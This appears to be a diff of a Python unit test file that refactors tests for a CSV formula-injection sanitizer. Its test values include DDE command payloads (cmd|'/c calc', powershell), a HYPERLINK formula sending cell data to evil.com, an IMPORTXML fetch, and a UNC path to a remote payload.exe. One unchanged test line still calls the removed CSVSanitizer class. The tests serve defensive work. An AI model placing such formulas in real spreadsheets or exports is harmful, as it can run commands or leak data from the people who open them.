@@ -18,7 +18,7 @@ import csv
 import os
 from pathlib import Path
 
-from shared.csv_sanitizer import CSVSanitizer
+from shared.csv_sanitizer import sanitize_field, sanitize_record, sanitize_records, is_dangerous
 from shared.file_operations import save_csv
 
 
@@ -28,47 +28,47 @@ class TestCSVSanitizer_FormulaInjection(unittest.TestCase):
     def test_formula_injection_equals__neutralized(self):
         """Test that formulas starting with = are neutralized."""
         dangerous_value = "=cmd|'/c calc'"
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         # Should be prefixed with single quote to neutralize
         self.assertEqual(result, "'=cmd|'/c calc'")
-        self.assertTrue(CSVSanitizer.is_dangerous(dangerous_value))
+        self.assertTrue(is_dangerous(dangerous_value))
 
     def test_formula_injection_plus__neutralized(self):
         """Test that formulas starting with + are neutralized."""
         dangerous_value = "+cmd|'/c notepad'"
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         self.assertEqual(result, "'+cmd|'/c notepad'")
-        self.assertTrue(CSVSanitizer.is_dangerous(dangerous_value))
+        self.assertTrue(is_dangerous(dangerous_value))
 
     def test_formula_injection_minus__neutralized(self):
         """Test that formulas starting with - are neutralized."""
         dangerous_value = "-cmd|'/c powershell'"
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         self.assertEqual(result, "'-cmd|'/c powershell'")
-        self.assertTrue(CSVSanitizer.is_dangerous(dangerous_value))
+        self.assertTrue(is_dangerous(dangerous_value))
 
     def test_formula_injection_at__neutralized(self):
         """Test that formulas starting with @ are neutralized."""
         dangerous_value = "@SUM(1+1)*cmd|'/c calc'"
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         self.assertEqual(result, "'@SUM(1+1)*cmd|'/c calc'")
-        self.assertTrue(CSVSanitizer.is_dangerous(dangerous_value))
+        self.assertTrue(is_dangerous(dangerous_value))
 
     def test_formula_injection_sum__neutralized(self):
         """Test that SUM formulas are neutralized."""
         dangerous_value = "=SUM(A1:A10)"
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         self.assertEqual(result, "'=SUM(A1:A10)")
 
     def test_formula_injection_hyperlink__neutralized(self):
         """Test that HYPERLINK formulas with exfiltration attempts are neutralized."""
         dangerous_value = '=HYPERLINK("http://evil.com/?data="&A1&A2,"Click me")'
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         self.assertTrue(result.startswith("'"))
 
@@ -79,16 +79,16 @@ class TestCSVSanitizer_CommandInjection(unittest.TestCase):
     def test_command_injection_pipe__neutralized(self):
         """Test that command pipe operators are neutralized."""
         dangerous_value = "=cmd|'/c calc'!A0"
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         self.assertTrue(result.startswith("'"))
-        self.assertTrue(CSVSanitizer.is_dangerous(dangerous_value))
+        self.assertTrue(is_dangerous(dangerous_value))
 
     def test_command_injection_embedded_pipe__neutralized(self):
         """Test that embedded pipe commands are neutralized."""
         # This should be caught by the suspicious pattern check
         dangerous_value = "test cmd|'/c notepad' embedded"
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         self.assertTrue(result.startswith("'"))
 
@@ -99,17 +99,17 @@ class TestCSVSanitizer_URIInjection(unittest.TestCase):
     def test_uri_injection_http__neutralized(self):
         """Test that HTTP URIs in formula context are neutralized."""
         dangerous_value = "=IMPORTXML(\"http://evil.com/data.xml\",\"//node\")"
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         self.assertTrue(result.startswith("'"))
 
     def test_uri_injection_file__neutralized(self):
         """Test that file:// URIs are neutralized."""
         dangerous_value = "file:///c:/windows/system32/calc.exe"
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         self.assertTrue(result.startswith("'"))
-        self.assertTrue(CSVSanitizer.is_dangerous(dangerous_value))
+        self.assertTrue(is_dangerous(dangerous_value))
 
 
 class TestCSVSanitizer_UNCPathInjection(unittest.TestCase):
@@ -118,10 +118,10 @@ class TestCSVSanitizer_UNCPathInjection(unittest.TestCase):
     def test_unc_path_injection__neutralized(self):
         """Test that UNC paths are neutralized."""
         dangerous_value = "\\\\evil.com\\share\\payload.exe"
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         self.assertTrue(result.startswith("'"))
-        self.assertTrue(CSVSanitizer.is_dangerous(dangerous_value))
+        self.assertTrue(is_dangerous(dangerous_value))
 
 
 class TestCSVSanitizer_SpecialCharacters(unittest.TestCase):
@@ -130,21 +130,21 @@ class TestCSVSanitizer_SpecialCharacters(unittest.TestCase):
     def test_newline_injection__neutralized(self):
         """Test that newlines at start are neutralized."""
         dangerous_value = "\ninjected line"
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         self.assertTrue(result.startswith("'"))
 
     def test_tab_injection__neutralized(self):
         """Test that tabs at start are neutralized."""
         dangerous_value = "\tinjected tab"
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         self.assertTrue(result.startswith("'"))
 
     def test_carriage_return_injection__neutralized(self):
         """Test that carriage returns at start are neutralized."""
         dangerous_value = "\rinjected CR"
-        result = CSVSanitizer.sanitize_field(dangerous_value)
+        result = sanitize_field(dangerous_value)
 
         self.assertTrue(result.startswith("'"))
 
@@ -158,7 +158,7 @@ class TestCSVSanitizer_SafeValues(unittest.TestCase):
         result = CSVSanitizer.sanitize_field(safe_value)
 
         self.assertEqual(result, safe_value)
-        self.assertFalse(CSVSanitizer.is_dangerous(safe_value))
+        self.assertFalse(is_dangerous(safe_value))
 
     def test_empty_string__unchanged(self):
         """Test that empty strings are handled correctly."""
@@ -208,7 +208,7 @@ class TestCSVSanitizer_RecordSanitization(unittest.TestCase):
             "category": "Nature"
         }
 
-        result = CSVSanitizer.sanitize_record(record)
+        result = sanitize_record(record)
 
         self.assertTrue(result["title"].startswith("'"))
         self.assertEqual(result["description"], "Normal description")
@@ -223,7 +223,7 @@ class TestCSVSanitizer_RecordSanitization(unittest.TestCase):
             {"title": "Safe", "desc": "Also safe"}
         ]
 
-        result = CSVSanitizer.sanitize_records(records)
+        result = sanitize_records(records)
 
         self.assertEqual(len(result), 3)
         self.assertTrue(result[0]["title"].startswith("'"))
@@ -320,7 +320,7 @@ class TestCSVSanitizer_EdgeCases(unittest.TestCase):
         for pattern in patterns:
             with self.subTest(pattern=pattern):
                 self.assertTrue(
-                    CSVSanitizer.is_dangerous(pattern),
+                    is_dangerous(pattern),
                     f"Pattern '{pattern}' should be detected as dangerous"
                 )
 
